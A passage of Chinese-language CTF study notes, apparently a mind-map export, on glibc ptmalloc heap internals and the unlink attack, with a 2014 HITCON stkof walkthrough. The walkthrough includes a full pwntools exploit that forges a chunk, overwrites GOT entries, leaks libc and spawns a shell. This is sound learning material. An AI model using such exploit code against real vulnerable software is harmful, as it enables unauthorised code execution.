+<a name="1idfb3vjvvn5ftc2890f3dnp5q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行munmap()释放chunk</a>
+</h3>
+<h3 class="topic">
+<a name="2p6n09vaq9s88cu37eppdmfaje">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;否</a>
+</h3>
+<h3 class="topic">
+<a name="6hg85j18kcuj1cnggq26fh4jjt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check prev，即前一块是否在使用当中</a>
+</h3>
+<h3 class="topic">
+<a name="3r7obgohvsc81tggrqvhhkl8dd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果前一块是topchunk 则直接将本chunk合并到top chunk中</a>
+</h3>
+<h3 class="topic">
+<a name="7g4skgctb3af0u8qqq93agikem">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果前一块不是topchunk，则正常的合并chunk</a>
+</h3>
+<h3 class="topic">
+<a name="23alreqj8jc13moqju5ol4gn1s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;check&gt;FASTBIN_CONSOLIDATION_THRESHOLD?</a>
+</h3>
+<h3 class="topic">
+<a name="7djc65vlspb7mgj71ntgj3ktro">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chunk&gt;mmap收缩阈值</a>
+</h3>
+<h3 class="topic">
+<a name="1fluqb8std482t3032nm1kijuh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;End</a>
+</h3>
+<h3 class="topic">
+<a name="56e3fu8dhbid1qtfu7qtq04t6a">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;否</a>
+</h3>
+<h3 class="topic">
+<a name="6ge4bhlr66pqrougmpqhn29rkq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;检查size&lt;=64B</a>
+</h3>
+<h3 class="topic">
+<a name="5el0plf6ebrtl6boh5g1pbavnl">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;是</a>
+</h3>
+<h3 class="topic">
+<a name="5tur71h2eke6bqetlq4ci5l21i">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将其放入fastbin中---put into fastbin</a>
+</h3>
+<h3 class="topic">
+<a name="14u6dcrg84mop8ilqii38d4qif">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;否</a>
+</h3>
+<p class="relationships">参见: <a href="#66rlbebin5bhgjqab8e4val956">被free的chunk是否为mmaped chunk？ (跳转到)</a>
+</p>
+<h3 class="topic">
+<a name="15m8ad4u5n2a2q6rsvq5vrpd2a">&nbsp;&nbsp;注意堆块合并过程中</a>
+</h3>
+<h3 class="topic">
+<a name="4uo2rbgd5dctmb76ltno6dqt0l">&nbsp;&nbsp;&nbsp;后向合并即合并低地址处的chunk</a>
+</h3>
+<h3 class="topic">
+<a name="5qvet5eu41bp0u6ao375duif12">&nbsp;&nbsp;&nbsp;前向合并即合并高地址处的chunk</a>
+</h3>
+<h3 class="topic">
+<a name="04koscgrkafldgcs3b57ca7cg3">&nbsp;&nbsp;后续需要去看</a>
+</h3>
+<h3 class="topic">
+<a name="5lf4ke97l2kp4mue8bjacgeb6b">&nbsp;&nbsp;&nbsp;Glibc内存管理Ptmalloc2源代码分析 .pdf</a>
+</h3>
+<h3 class="topic">
+<a name="56pihfa0qir4qor8lb8ubu5bfs">&nbsp;&nbsp;如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下</a>
+</h3>
+<h3 class="topic">
+<a name="02j25t3g5gt1555lg4uhrl0eb2">&nbsp;&nbsp;&nbsp;    /*&#13;
+       If a small request, check regular bin.  Since these "smallbins"&#13;
+       hold one size each, no searching within bins is necessary.&#13;
+       (For a large request, we need to wait until unsorted chunks are&#13;
+       processed to find best fit. But for small ones, fits are exact&#13;
+       anyway, so we can check now, which is faster.)&#13;
+     */&#13;
+&#13;
+    if (in_smallbin_range(nb)) {&#13;
+        // 获取 small bin 的索引&#13;
+        idx = smallbin_index(nb);&#13;
+        // 获取对应 small bin 中的 chunk 指针&#13;
+        bin = bin_at(av, idx);&#13;
+        // 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk&#13;
+        // 如果 victim = bin ，那说明该 bin 为空。&#13;
+        // 如果不相等，那么会有两种情况&#13;
+        if ((victim = last(bin)) != bin) {&#13;
+            // 第一种情况，small bin 还没有初始化。&#13;
+            if (victim == 0) /* initialization check */&#13;
+                // 执行初始化，将 fast bins 中的 chunk 进行合并&#13;
+                malloc_consolidate(av);&#13;
+            // 第二种情况，small bin 中存在空闲的 chunk&#13;
+            else {&#13;
+                // 获取 small bin 中倒数第二个 chunk 。&#13;
+                bck = victim-&gt;bk;&#13;
+                // 检查 bck-&gt;fd 是不是 victim，防止伪造&#13;
+                if (__glibc_unlikely(bck-&gt;fd != victim)) {&#13;
+                    errstr = "malloc(): smallbin double linked list corrupted";&#13;
+                    goto errout;&#13;
+                }&#13;
+                // 设置 victim 对应的 inuse 位&#13;
+                set_inuse_bit_at_offset(victim, nb);&#13;
+                // 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来&#13;
+                bin-&gt;bk = bck;&#13;
+                bck-&gt;fd = bin;&#13;
+                // 如果不是 main_arena，设置对应的标志&#13;
+                if (av != &amp;main_arena) set_non_main_arena(victim);&#13;
+                // 细致的检查&#13;
+                check_malloced_chunk(av, victim, nb);&#13;
+                // 将申请到的 chunk 转化为对应的 mem 状态&#13;
+                void *p = chunk2mem(victim);&#13;
+                // 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff&#13;
+                alloc_perturb(p, bytes);&#13;
+                return p;&#13;
+            }&#13;
+        }&#13;
+    }</a>
+</h3>
+<h3 class="topic">
+<a name="1h9ipfcfdnvein3p7kjp2hsau7">&nbsp;堆中的检查机制</a>
+</h3>
+<h3 class="topic">
+<a name="7tmahsk1blfs9iurf5051qri5v">&nbsp;&nbsp;_int_malloc</a>
+</h3>
+<h3 class="topic">
+<a name="142h4fjvurcuihhjhp95qkb4ob">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/140oqppsonjjvd8clvqi5eeqot.png"></p>
+<h3 class="topic">
+<a name="1nepq42te6cavavm5i12h55ot7">&nbsp;&nbsp;&nbsp;&nbsp;_libc_free</a>
+</h3>
+<h3 class="topic">
+<a name="1skahndkiqdulm687ni355aglf">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1eh4th4a7jf1lb6sbjqifl6gbo.png"></p>
+<h3 class="topic">
+<a name="0repvtcdm01dpeolop3fh11cji">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;__int_free</a>
+</h3>
+<h3 class="topic">
+<a name="3mn6meaprj8tt64abbt9kbp622">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/2vesst83vmeh417ai036pkp49d.png"></p>
+<h3 class="topic">
+<a name="03qg10mr0ek8n2skf3mqc58eog">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unlink</a>
+</h3>
+<h3 class="topic">
+<a name="2d5bfnhajrodje6m6qeqhna4kg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/3gloak9g748qntapn1hbomk478.png"></p>
+<h3 class="topic">
+<a name="1n5ripq1hec394aou7o09o9ff5">&nbsp;堆溢出基础</a>
+</h3>
+<h3 class="topic">
+<a name="3uvc0s6mtb099t4522ttmivjip">&nbsp;&nbsp;介绍</a>
+</h3>
+<h3 class="topic">
+<a name="28n0v5envraflqvjbk7holf6fm">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0furdojvv7ag6fhjqos2817tor.png"></p>
+<h3 class="topic">
+<a name="2n09tep0bt0sf4sev39ohgrqk4">&nbsp;&nbsp;&nbsp;&nbsp;注意堆块中可用的字节数为不小于用户申请的字节数，即堆管理器会根据用户申请的的字节数，分配给chunk大于等于申请字节数的可用堆空间</a>
+</h3>
+<h3 class="topic">
+<a name="0fdkn9kqsmb8nin8rgj7857te2">&nbsp;&nbsp;堆溢出攻击目标</a>
+</h3>
+<h3 class="topic">
+<a name="5cum8g0odutba4mdlqbfss056u">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/6samu4uik4ti1799ns2imb7ii7.png"></p>
+<h3 class="topic">
+<a name="5g5f97ccu9c5lh5cqd6us2v2em">&nbsp;&nbsp;&nbsp;&nbsp;堆中不存在函数返回地址，所以无法通过堆溢出直接修改程序执行流程，一般是通过修改chunk中的数据结构或利用堆的操作实现任意地址写任意数据，从而控制程序执行流程</a>
+</h3>
+<h3 class="topic">
+<a name="318dokjrkh28dra130b7gfbl6m">&nbsp;&nbsp;基本示例</a>
+</h3>
+<h3 class="topic">
+<a name="5d34jrfvpk17jl8i4vb6uv06nl">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/5bn0nqc2rm1lm9tki08bc0khts.png"></p>
+<h3 class="topic">
+<a name="054fpo2berkjljp06pfou6rm6f">&nbsp;&nbsp;分析堆溢出的关键步骤</a>
+</h3>
+<h3 class="topic">
+<a name="6vc2im37oht400m1m5tb38kqtj">&nbsp;&nbsp;&nbsp;寻找堆分配函数</a>
+</h3>
+<h3 class="topic">
+<a name="509kqh1c72kukt5beu3edt2naf">&nbsp;&nbsp;&nbsp;&nbsp;三个关键函数：malloc calloc realloc</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/3ifm47p5f59hh1enp4ks067c7u.png"></p>
+<h3 class="topic">
+<a name="6o88sglg0bt6bdpnkoek600gt0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;realloc函数的实际功能</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0m0ie145q33vvunoaammqjhfv9.png"></p>
+<h3 class="topic">
+<a name="5j6gjtjetiteob7tuug4ko43e1">&nbsp;&nbsp;&nbsp;寻找危险函数</a>
+</h3>
+<h3 class="topic">
+<a name="5232asdn0l6kuaa0o3kh3irk4g">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0nsstpabpdrs6qov4kf22e70kq.png"></p>
+<h3 class="topic">
+<a name="315j4t5csn901mgc7le16dudkd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;即会往堆空间中写入数据的函数</a>
+</h3>
+<h3 class="topic">
+<a name="16etqelb9q8orkuu4cuflnp5qu">&nbsp;&nbsp;&nbsp;确定填充长度</a>
+</h3>
+<h3 class="topic">
+<a name="3r9ej7l1qt3bcj5ukih5kuupdv">&nbsp;&nbsp;&nbsp;&nbsp;ptmalloc中申请的堆空间大小一定是对齐的，对齐粒度为字长的两倍（32位中位8字节，64位中为16字节），不大于对其粒度的内存申请请求mallo会返回当前硬件条件下最小的chunk（32位中最小的chunk是16字节，其中8字节chunk头8字节用户空间  64位中最小的chunk32字节，16字节的chunk头，16字节的用户空间）</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/735gqv8tii1e3t1hc5jgc7l752.png"></p>
+<h3 class="topic">
+<a name="2sp1ei3esrh1phg10kmrd99nhr">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;只有当一个chunk用户空间的大小不能被2*sizeof（size_t）整除时（在64位中即不能被16整除，32位中即不能被8整除），才会将相邻的内存高地址的chunk的prev_size当作自己的内容区域</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1hppq2shh7t58legm1l08ju0iu.png"></p>
+<h3 class="topic">
+<a name="4q1ebrm9aja10rmjtc1urskkpc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/6egbq4g2pe3mhj6p93knlqdb7u.png"></p>
+<h3 class="topic">
+<a name="5ind7r5837ab0q9r2far0recc4">&nbsp;Unlink</a>
+</h3>
+<h3 class="topic">
+<a name="0rkhcv4hjtt41d3cckkfdc4ilj">&nbsp;&nbsp;Unlink的原理和过程</a>
+</h3>
+<h3 class="topic">
+<a name="60a59gff37kf5ib8vmrltlj4ov">&nbsp;&nbsp;&nbsp;主要是针对被断链的chunk进行构造从而在该chunk执行断链的指针操作过程中，修改任意内存地址中的中的数据为指定数据</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0au30s6pvnkuink73c18l8bods.png"></p>
+<h3 class="topic">
+<a name="7vs3id8leca4km1jpcn9l867bg">&nbsp;&nbsp;没有防护时的Unlink</a>
+</h3>
+<h3 class="topic">
+<a name="1hvedoj853mtokfk58s9cabe9s">&nbsp;&nbsp;&nbsp;最初Unlink操作没有以下检查机制</a>
+</h3>
+<h3 class="topic">
+<a name="736ahoi1cdjktos8f8jk4lrbfb">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1vd220op5tfumj7smhq9nn77do.png"></p>
+<h3 class="topic">
+<a name="7323lr78r804aijbldot60no43">&nbsp;&nbsp;&nbsp;通过设置被unlink的fd、bk指针从而向任意内存地址写任意数据</a>
+</h3>
+<h3 class="topic">
+<a name="5b9lcpc2b81aaf01ljnnu00m09">&nbsp;&nbsp;&nbsp;&nbsp;根据size可知，该chunk为一个small chunk，当释放small chunk的时候，先检查该chunk相邻的chunk是否为free，如果是的话就进行合并操作：将这些chunks合并成新的chunk，然后将它们从small bin中移除，最后将新的chunk添加到unsorted bin中。</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/5qohl9mho4h9u90e9p4m2ra7s5.png"></p>
+<h3 class="topic">
+<a name="4o9uc8lkge3s4977nojcfritkg">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时该small chunk的相邻chunk为空闲，当free该chunk，会导致两个chunk合并，合并的过程中需要将两个chunk均断链，（这一步被利用）然后组成新的chunk，链入unsorted bin中</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/7nl2k8es7f7bkftqbjikmtuph4.png"></p>
+<h3 class="topic">
+<a name="5l6jd763h9gm1sum4030t7ch70">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意此时fd bk的值需要特殊构造，一个是目标地址，一个目标值</a>
+</h3>
+<h3 class="topic">
+<a name="1atvfds98614hjs1c9ebrsbigk">&nbsp;&nbsp;当前有防护的unlink</a>
+</h3>
+<h3 class="topic">
+<a name="0ob8ms1klq89j12tk7rm3hdbk6">&nbsp;&nbsp;&nbsp;绕过对fd和bk的检查</a>
+</h3>
+<h3 class="topic">
+<a name="7bvr178rsds40vqgrhbqq5c3n8">&nbsp;&nbsp;&nbsp;&nbsp;32位linux中</a>
+</h3>
+<h3 class="topic">
+<a name="618an2gpgqdfkr8jqhgr44dfoo">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时如果想绕过fd、bk检查，需要让&#13;
+target_addr=p，&#13;
+expect value+8=p，&#13;
+没有检查机制时，被断链的chunk中&#13;
+fd=target_addr-12，&#13;
+bk=expect value，&#13;
+则此时&#13;
+fd=target_addr-12=p-12&#13;
+bk=expect value=p-8</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1e0j0d3kpl0dkvc8beu18mjtss.png"></p>
+<h3 class="topic">
+<a name="5sjr0858frglaf6hfp1gksubv7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果&#13;
+fd=target_addr-12=p-12&#13;
+bk=expect value=p-8&#13;
+则在执行&#13;
+FD-&gt;bk=BK //对应*P= expect value = P - 8&#13;
+BK-&gt;fd=FD //对应*P = target addr -12 = P - 12&#13;
+之后，被断链chunk的内存首地址中的数据被修改为p-12</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/2omkt6r0u7pe87ij7kh3ip5b09.png"></p>
+<h3 class="topic">
+<a name="54ah727m6er8vj2dm2j4vd365m">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据之后的例子，修改chunk起始内存中的内容是有意义的</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/0aq4k3ubt7sr9cukbumctvr5eu.png"></p>
+<h3 class="topic">
+<a name="0jub9n83hhse4oai967q7t5acq">&nbsp;&nbsp;&nbsp;&nbsp;64位linux中</a>
+</h3>
+<h3 class="topic">
+<a name="7fpci2mm9arusiccdocjv64l61">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;大致流程同上，但是64位中一个指针为8字节，所以&#13;
+如果要绕过检验，需要&#13;
+fd=p-24=p-0x18&#13;
+bk=p-16=p-0x10</a>
+</h3>
+<h3 class="topic">
+<a name="442dpma6bttc6h96a8eljalbfm">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/53cihlle3pjs8621ac5434t6dm.png"></p>
+<h3 class="topic">
+<a name="5jeentjng5lnibosce4r9khqjj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;所以绕过检查的关键是，找到一个内存地址，该内存地址处保存着指向chunk的指针，以该内存地址为基础构造fd bk指针，从而绕过</a>
+</h3>
+<h3 class="topic">
+<a name="1siijs054ufqu799d9hadtpovc">&nbsp;&nbsp;示例</a>
+</h3>
+<h3 class="topic">
+<a name="6vj7u2vchu4e7qn4a67u0hpb5o">&nbsp;&nbsp;&nbsp;2014 HITCON stkof</a>
+</h3>
+<h3 class="topic">
+<a name="23vlrk31v12nii5k66e4mcjdup">&nbsp;&nbsp;&nbsp;&nbsp;程序基本信息</a>
+</h3>
+<h3 class="topic">
+<a name="24mjgr9ftdodnbii3j2jue9u6l">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要有Canary和NX保护</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/60ehrgir2hum58sssro60rnjbo.png"></p>
+<h3 class="topic">
+<a name="7ebijo2rfrulmbm1pmq3r1btei">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序基本功能</a>
+</h3>
+<h3 class="topic">
+<a name="6hg4lhg9a6aqt4g85dnuagik58">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/60k9qortanpnuamfbgui52j4eq.png"></p>
+<h3 class="topic">
+<a name="1vidtpj6p9q75mbc3e1um3t3dj">&nbsp;&nbsp;&nbsp;&nbsp;初步测试</a>
+</h3>
+<h3 class="topic">
+<a name="1icr9bfl3uc7qhh8e9j6hta3ec">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;程序在执行输入输出函数时，会执行malloc函数申请缓冲区，此类缓冲区会改变堆区本来的结构，所以需要分析</a>
+</h3>
+<h3 class="topic">
+<a name="5iu0upmprefqgelmnp9bfltm9u">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fgets函数申请1024字节的缓冲区</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/51pe9e5d476c20hnjbcsipd3m7.png"></p>
+<h3 class="topic">
+<a name="60fs1828fee27s1kdgi0kl69f8">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时堆空间情况</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/3tp8t4oipodpgojjlro8p0vk1h.png"></p>
+<h3 class="topic">
+<a name="702tas1fbk7sbajt1p6cvr791v">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时又分配16字节堆空间</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/7sdo5m4hgttiiisol744rf79q5.png"></p>
+<h3 class="topic">
+<a name="3oek4e8v49124dulgobrijn58b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;执行printf函数输出会导致申请1024字节缓冲区</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/327jdjh7k0qqjq6hn955ht65nn.png"></p>
+<h3 class="topic">
+<a name="1s79rideoaqirvmcp9k51c7g7f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时堆中的情况，此后，无论是输入输出都不会再申请缓冲去了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/2hhcfiboe460ev27rpgm7pqe98.png"></p>
+<h3 class="topic">
+<a name="06k5dpb68a8hcosm3qk7hfroju">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时如果是attach上去的第一次分配大缓冲区大小为4096字节</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/70kkjocvb1e161ead5tpk4fogd.png"></p>
+<h3 class="topic">
+<a name="086dnj61t3vqq6v1e1fk47r8r7">&nbsp;&nbsp;&nbsp;&nbsp;利用思路与exp</a>
+</h3>
+<h3 class="topic">
+<a name="54pmi0lgndhgp3eredickthmou">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/1gn89uvmbbrkm6dj61476eu5k5.png"></p>
+<h3 class="topic">
+<a name="064qle4lqndef5nusiki4o9jmk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;context.terminal = ['gnome-terminal', '-x', 'sh', '-c']&#13;
+if args['DEBUG']:&#13;
+    context.log_level = 'debug'&#13;
+context.binary = "./stkof"&#13;
+stkof = ELF('./stkof')&#13;
+if args['REMOTE']:&#13;
+    p = remote('127.0.0.1', 7777)&#13;
+else:&#13;
+    p = process("./stkof")&#13;
+log.info('PID: ' + str(proc.pidof(p)[0]))&#13;
+libc = ELF('./libc.so.6')&#13;
+head = 0x602140&#13;
+&#13;
+&#13;
+def alloc(size):&#13;
+    p.sendline('1')&#13;
+    p.sendline(str(size))&#13;
+    p.recvuntil('OK\n')&#13;
+&#13;
+&#13;
+def edit(idx, size, content):&#13;
+    p.sendline('2')&#13;
+    p.sendline(str(idx))&#13;
+    p.sendline(str(size))&#13;
+    p.send(content)&#13;
+    p.recvuntil('OK\n')&#13;
+&#13;
+&#13;
+def free(idx):&#13;
+    p.sendline('3')&#13;
+    p.sendline(str(idx))&#13;
+&#13;
+&#13;
+def exp():&#13;
+    # trigger to malloc buffer for io function&#13;
+    alloc(0x100)  # idx 1&#13;
+    # begin &#13;
+    alloc(0x30)  # idx 2&#13;
+    # small chunk size in order to trigger unlink&#13;
+    alloc(0x80)  # idx 3&#13;
+    # a fake chunk at global[2]=head+16 who's size is 0x20&#13;
+    payload = p64(0)  #prev_size&#13;
+    payload += p64(0x20)  #size&#13;
+    payload += p64(head + 16 - 0x18)  #fd&#13;
+    payload += p64(head + 16 - 0x10)  #bk&#13;
+    payload += p64(0x20)  # next chunk's prev_size bypass the check&#13;
+    payload = payload.ljust(0x30, 'a')&#13;
+    # overwrite global[3]'s chunk's prev_size&#13;
+    # make it believe that prev chunk is at global[2]&#13;
+    payload += p64(0x30)&#13;
+    # make it believe that prev chunk is free&#13;
+    payload += p64(0x90)&#13;
+    edit(2, len(payload), payload)&#13;
+    # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8&#13;
+    free(3)&#13;
+    p.recvuntil('OK\n')&#13;
+    #gdb.attach(p)&#13;
+    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got&#13;
+    payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(&#13;
+        stkof.got['atoi'])&#13;
+    edit(2, len(payload), payload)&#13;
+    # edit free@got to puts@plt&#13;
+    payload = p64(stkof.plt['puts'])&#13;
+    edit(0, len(payload), payload)&#13;
+&#13;
+    #free global[1] to leak puts addr&#13;
+    free(1)&#13;
+    puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')&#13;
+    puts_addr = u64(puts_addr)&#13;
+    log.success('puts addr: ' + hex(puts_addr))&#13;
+    libc_base = puts_addr - libc.symbols['puts']&#13;
+    binsh_addr = libc_base + next(libc.search('/bin/sh'))&#13;
+    system_addr = libc_base + libc.symbols['system']&#13;
+    log.success('libc base: ' + hex(libc_base))&#13;
+    log.success('/bin/sh addr: ' + hex(binsh_addr))&#13;
+    log.success('system addr: ' + hex(system_addr))&#13;
+    # modify atoi@got to system addr&#13;
+    payload = p64(system_addr)&#13;
+    edit(2, len(payload), payload)&#13;
+    p.send(p64(binsh_addr))&#13;
+    p.interactive()&#13;
+&#13;
+&#13;
+if __name__ == "__main__":&#13;
+    exp()&lsquo;</a>
+</h3>
+<h3 class="topic">
+<a name="21qm9m15t41seqv5halek2t0d5">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;    # trigger to malloc buffer for io function&#13;
+    alloc(0x100)  # idx 1&#13;
+    # begin &#13;
+    alloc(0x30)  # idx 2&#13;
+    # small chunk size in order to trigger unlink&#13;
+    alloc(0x80)  # idx 3&#13;
+    # a fake chunk at global[2]=head+16 who's size is 0x20&#13;
+    payload = p64(0)  #prev_size&#13;
+    payload += p64(0x20)  #size&#13;
+    payload += p64(head + 16 - 0x18)  #fd&#13;
+    payload += p64(head + 16 - 0x10)  #bk&#13;
+    payload += p64(0x20)  # next chunk's prev_size bypass the check&#13;
+    payload = payload.ljust(0x30, 'a')&#13;
+    # overwrite global[3]'s chunk's prev_size&#13;
+    # make it believe that prev chunk is at global[2]&#13;
+    payload += p64(0x30)&#13;
+    # make it believe that prev chunk is free&#13;
+    payload += p64(0x90)&#13;
+    edit(2, len(payload), payload)&#13;
+    # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8&#13;
+    free(3)&#13;
+    p.recvuntil('OK\n')</a>
+</h3>
+<h3 class="topic">
+<a name="1pi8fmek39bn06puga54ge9kro">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此段代码中，申请了3个堆块，最终目的是通过向第二堆块中写入数据，从而构建溢出</a>
+</h3>
+<h3 class="topic">
+<a name="0rieg7eadolk4ephbrou2uqa1t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此时申请第一个堆块的原因是该题目中没有使用setbuf函数，所以程序中使用的输入输出函数（gets、printf）均会在程序中产生缓冲区，该缓冲区被申请在堆中，根据申请次序，所产生的chunk的从内存低地址到内存高地址蔓延，具体情况见该题的初步分析</a>
+</h3>
+<h3 class="topic">
+<a name="655b7vkl3onq4s6ucprvu0uo7t">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了避免此类缓冲区的chunk与即将进行unlink的chunk相邻从而产生堆块合并等影响，所以申请第一个chunk用于将缓冲区chunk和unlink的chunk隔开</a>
+</h3>
+<h3 class="topic">
+<a name="5vtaimjtu4054ldbha800vjonm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于setbuf函数，大部分pwn题都会有这个函数，用来设置IO缓冲区的，第一个参数是文件流，第二个参数表示缓冲区，一般在pwn题中的用法是setbuf(stdin, 0)表示标准输入取消缓冲区。本题中没有调用该函数，所以存在输入输出函数的缓冲区</a>
+</h3>
+<h3 class="topic">
+<a name="3ioak5n1sqtucpv0jjutu6mcq2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/05pric8ceqoptd9uo7onpv81ci.png"></p>
+<h3 class="topic">
+<a name="3qcc0qmdk7jl6mik7865jfut7f">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="CTF PWN9_files/22snum0judue321jhrbh333ofj.png"></p>
+<h3 class="topic">
+<a name="2ur30qn2a123q293ahvt9akbk4">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;漏洞程序提供这样一种机制，申请的堆块时，会将malloc函数返回的指针以数组形式保存在BSS数据段中，可以使用1、2、3作为标识表示第一二三次申请的堆块</a>
+</h3>
+<h3 class="topic">
+<a name="2dod8ddslq3kk9tgdg000vsjbt">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同时程序提供editor函数，例如 edit(2, len(payload), payload)，就是将payload数据写入第二个堆块的用户空间中</a>
+</h3>
+<h3 class="topic">
